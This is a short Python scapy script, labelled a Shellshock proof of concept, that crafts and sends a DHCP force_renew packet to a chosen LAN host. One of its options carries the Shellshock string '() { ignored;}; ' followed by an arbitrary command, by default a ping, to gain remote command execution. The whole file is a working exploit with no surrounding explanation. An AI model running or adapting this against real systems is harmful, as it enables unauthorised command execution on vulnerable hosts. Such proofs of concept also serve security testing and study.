#!/usr/bin/env python

import argparse

from scapy.all import *

def parse_args():
    p = argparse.ArgumentParser(description=
        '''
        Shellshock proof of concept.
        ''', formatter_class=argparse.RawTextHelpFormatter)

    p.add_argument('-c', '--command', default='ping 192.168.1.12')
    p.add_argument('-s', '--src-mac', required=True,
        help="your mac address on lan")
    p.add_argument('-d', '--dst-mac', required=True,
        help="test mac address on lan")
    p.add_argument('-r', '--src-ip', required=True,
        help="your ip address on lan")
    p.add_argument('-t', '--dst-ip', required=True,
        help="test ip address on lan")

    args = p.parse_args()
    return args

def main():
    args = parse_args()

    sendp(Ether(src=args.src_mac, dst=args.dst_mac)/
        IP(src=args.src_ip, dst=args.dst_ip)/
        UDP(sport=68,dport=67)/
        BOOTP(chaddr=args.src_mac)/
        DHCP(options=[("message-type","force_renew"), ("test", "() { ignored;}; " + args.command)]))

if __name__ == "__main__":
    main()
